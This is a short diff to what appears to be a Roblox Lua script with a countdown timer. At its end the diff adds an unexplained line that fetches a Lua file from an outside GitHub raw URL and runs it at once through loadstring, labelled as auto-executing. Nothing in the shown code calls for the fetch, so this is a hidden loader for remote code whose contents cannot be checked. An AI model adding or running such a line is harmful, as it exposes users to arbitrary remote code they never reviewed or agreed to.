@@ -95,3 +95,7 @@ task.spawn(function()
     -- After final timer, show completion message
     TimerLabel.Text = "Restarting script"
 end)
+
+
+-- ✅ **Auto-execute the loadstring immediately**
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ringtaa/renerj.github.io/refs/heads/main/erjer.lua"))()
